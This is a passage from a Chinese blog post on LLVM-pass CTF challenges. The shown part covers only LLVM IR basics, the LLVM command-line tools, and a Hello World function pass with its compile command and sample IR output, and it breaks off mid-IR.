<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>LLVM-PASS-PWN学习 | aYoung's Blog</title><meta name="keywords" content="ctf,pwn,llvm"><meta name="author" content="aYoung"><meta name="copyright" content="aYoung"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="LLVMLLVM是一个编译器框架。LLVM作为编译器框架，是需要各种功能模块支撑起来的，可以将clang和lld都看做是LLVM的组成部分。下图是Clang&#x2F;LLVM的简单架构。  LLVM IRLLVM IR是LLVM的中间表示，文档https:&#x2F;&#x2F;llvm.org&#x2F;docs&#x2F;LangRef.html LLVM中，IR有三种表示  .ll：给人类看的，介于高等语言和汇编之间 .bc：不可读的二进">
<meta property="og:type" content="article">
<meta property="og:title" content="LLVM-PASS-PWN学习">
<meta property="og:url" content="https://iamayoung.xyz/2022/07/13/LLVM-PASS-PWN%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="aYoung&#39;s Blog">
<meta property="og:description" content="LLVMLLVM是一个编译器框架。LLVM作为编译器框架，是需要各种功能模块支撑起来的，可以将clang和lld都看做是LLVM的组成部分。下图是Clang&#x2F;LLVM的简单架构。  LLVM IRLLVM IR是LLVM的中间表示，文档https:&#x2F;&#x2F;llvm.org&#x2F;docs&#x2F;LangRef.html LLVM中，IR有三种表示  .ll：给人类看的，介于高等语言和汇编之间 .bc：不可读的二进">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img1.imgtp.com/2022/07/13/qWpwPIW3.png">
<meta property="article:published_time" content="2022-07-13T03:35:17.000Z">
<meta property="article:modified_time" content="2023-02-14T04:56:32.747Z">
<meta property="article:author" content="aYoung">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="llvm">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img1.imgtp.com/2022/07/13/qWpwPIW3.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://iamayoung.xyz/2022/07/13/LLVM-PASS-PWN%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-02-14 12:56:32'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://s4.ax1x.com/2022/01/14/731OZF.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">81</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img1.imgtp.com/2022/07/13/qWpwPIW3.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">aYoung's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">LLVM-PASS-PWN学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-13T03:35:17.000Z" title="发表于 2022-07-13 11:35:17">2022-07-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-14T04:56:32.747Z" title="更新于 2023-02-14 12:56:32">2023-02-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h1><p>LLVM是一个编译器框架。LLVM作为编译器框架，是需要各种功能模块支撑起来的，可以将clang和lld都看做是LLVM的组成部分。下图是Clang/LLVM的简单架构。</p>
<p><a target="_blank" rel="noopener" href="https://img1.imgtp.com/2022/07/20/b1uCYPaP.png"><img src="https://img1.imgtp.com/2022/07/20/b1uCYPaP.png" alt="1658306349629.png"></a></p>
<h1 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h1><p>LLVM IR是LLVM的中间表示，文档<a target="_blank" rel="noopener" href="https://llvm.org/docs/LangRef.html">https://llvm.org/docs/LangRef.html</a></p>
<p>LLVM中，IR有三种表示</p>
<ul>
<li><code>.ll</code>：给人类看的，介于高等语言和汇编之间</li>
<li><code>.bc</code>：不可读的二进制IR，称作位码（bitcode）</li>
<li>内存格式</li>
</ul>
<h1 id="LLVM相关工具"><a href="#LLVM相关工具" class="headerlink" title="LLVM相关工具"></a>LLVM相关工具</h1><p>opt是一个在IR级别做程序优化的工具，输入和输出都是同一类型的LLVM IR</p>
<p>llvm-link，是IR级别的链接器，链接IR文件</p>
<p>llvm-as是针对LLVM IR的汇编器，功能是将<code>.ll</code>文件翻译为<code>.bc</code>文件。在LLVM项目里，<code>.ll</code>称为LLVM汇编码。</p>
<p>llvm-dis和llvm-as相反，即IR的反汇编器，将<code>.bc</code>文件翻译为<code>.ll</code>文件</p>
<p>clang。通过指定<code>-emit-llvm</code>参数，可以配合<code>-S</code>或<code>-c</code>生成<code>.ll</code>或<code>.bc</code>文件，就能把Clang的部分和LLVM的后端分离开独立运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure>
<h1 id="LLVM-PASS"><a href="#LLVM-PASS" class="headerlink" title="LLVM PASS"></a>LLVM PASS</h1><p>然后学习一下LLVM PASS是什么<br>学习链接：<br><a target="_blank" rel="noopener" href="http://www.aosabook.org/en/llvm.html">http://www.aosabook.org/en/llvm.html</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/122522485">https://zhuanlan.zhihu.com/p/122522485</a><br><a target="_blank" rel="noopener" href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a> （官方）<br><a target="_blank" rel="noopener" href="https://llvm.org/devmtg/2019-04/slides/Tutorial-Bridgers-LLVM_IR_tutorial.pdf">https://llvm.org/devmtg/2019-04/slides/Tutorial-Bridgers-LLVM_IR_tutorial.pdf</a></p>
<p>LLVM Pass框架是LLVM系统的重要组成部分，因为LLVM Passes是编译器中最有意思的部分。Passes执行构成编译器的转换和优化，它们构建这些转换所使用的分析结果，并且它们首先是编译器代码的结构化技术。</p>
<p>所有LLVM passes都是Pass的子类，它们能通过重写继承自Pass的虚拟方法来实现功能。根据你的pass如何工作，你应该继承ModulePass , CallGraphSCCPass, FunctionPass , or LoopPass, 或者RegionPass类，这些类为系统提供了更多关于你的pass做什么的信息，以及它如何与其他pass类相结合。LLVM Pass框架的一个重要特征是它根据你的pass满足的约束（由他们的派生类指示）来调度passes以一个有效的方式运行</p>
<h2 id="Hello-world-of-passes"><a href="#Hello-world-of-passes" class="headerlink" title="Hello world of passes"></a>Hello world of passes</h2><p>环境安装，直接使用预编译包<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install llvm</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install clang</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>可以通过sudo apt install llvm-x.y来指定版本</p>
</blockquote>
<p>代码如下<br>命名空间<code>llvm</code><br><code>namespace&#123;</code>开始于一个匿名空间。匿名空间之于c++就像<code>static</code>关键字之于C（在全局作用域）。它让匿名空间内声明的内容仅对当前文件可见。</p>
<p>接下来<code>struct Hello : public FunctionPass &#123;</code>声明了一个<code>Hello</code>类，它是<code>FunctionPass</code>的子类。<code>FunctionPass</code>每次操作一个函数</p>
<p>接着声明LLVM用来标识pass的pass标识符，这允许LLVM避免使用expensive C++ runtime information<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line"><span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>声明一个<code>runOnFunction</code>方法，它重写了继承自FunctionPass的抽象虚拟方法。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">    <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br></pre></td></tr></table></figure></p>
<p><code>char Hello::ID = 0;</code>初始化pass ID。LLVM使用ID地址来标识一个通道，所以初始化值并不重要</p>
<p>最后注册Hello类，给他一个命令行参数”hello”，并命名为”Hello World Pass”。最后两个参数描述了它的行为，如果一个pass不修改<code>CFG</code>，那么第三个参数就被设置为true；如果一个pass是一个分析pass，例如dominator tree pass，那么true就会作为第四个参数。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>完整代码，作用就是在<code>runOnFunction</code>中，遍历了IR中的函数，并打印出函数名称<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">  <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">    <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">    [](<span class="type">const</span> PassManagerBuilder &amp;Builder,</span></span></span><br><span class="line"><span class="params"><span class="function">       legacy::PassManagerBase &amp;PM) &#123; PM.add(<span class="keyword">new</span> Hello()); &#125;)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>编译<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure><br>即可得到一个LLVMHello.so文件</p>
<p>接下来可以使用<code>opt</code>命令通过pass来运行一个LLVM程序，因为使用<code>RegisterPass</code>注册了pass，所以一旦被加载就能使用<code>opt</code>访问它</p>
<p>现在随便写一个程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">a</span><span class="params">()</span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">b</span><span class="params">()</span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">c</span><span class="params">()</span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用<code>clang</code>编译成.ll文件<br><code>clang -emit-llvm -S main.c -o main.ll</code><br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; ModuleID = &#x27;main.c&#x27;</span></span><br><span class="line">source_filename <span class="operator">=</span> <span class="string">&quot;main.c&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">datalayout</span> <span class="operator">=</span> <span class="string">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">triple</span> <span class="operator">=</span> <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title">@.str</span> <span class="operator">=</span> <span class="keyword">private</span> <span class="keyword">unnamed_addr</span> <span class="keyword">constant</span> [<span class="number">4</span> <span class="keyword">x</span> <span class="type">i8</span>] <span class="keyword">c</span><span class="string">&quot;1!\0A<span class="char escape_">\00</span>&quot;</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> <span class="type">i32</span> <span class="title">@a</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="keyword">ret</span> <span class="type">i32</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> <span class="type">i32</span> <span class="title">@b</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="keyword">ret</span> <span class="type">i32</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> <span class="type">i32</span> <span class="title">@c</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="keyword">ret</span> <span class="type">i32</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> <span class="type">i32</span> <span class="title">@main</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%1</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%1</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i32</span> (<span class="type">i8</span>*<span class="punctuation">,</span> ...) <span class="title">@printf</span>(<span class="type">i8</span>* <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> ([<span class="number">4</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">4</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="title">@.str</span><span class="punctuation">,</span> <span class="type">i32</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i32</span> <span class="number">0</span>))</span><br><span class="line">  <span class="keyword">ret</span> <span class="type">i32</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="type">i32</span> <span class="title">@printf</span>(<span class="type">i8</span>*<span class="punctuation">,</span> ...) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">attributes</span> <span class="variable">#0</span> <span class="operator">=</span> &#123; <span class="keyword">noinline</span> <span class="keyword">nounwind</span> <span class="keyword">optnone</span> <span class="keyword">uwtable</span> <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span><span class="operator">=</span><span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span><span class="operator">=</span><span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span><span class="operator">=</span><span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span><span class="operator">=</span><span class="string">&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"><span class="keyword">attributes</span> <span class="variable">#1</span> <span class="operator">=</span> &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span><span class="operator">=</span><span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span><span class="operator">=</span><span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span><span class="operator">=</span><span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span><span class="operator">=</span><span class="string">&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!llvm.module.flags</span> <span class="operator">=</span> !&#123;<span class="title">!0</span>&#125;</span><br><span class="line"><span class="title">!llvm.ident</span> <span class="operator">=</span> 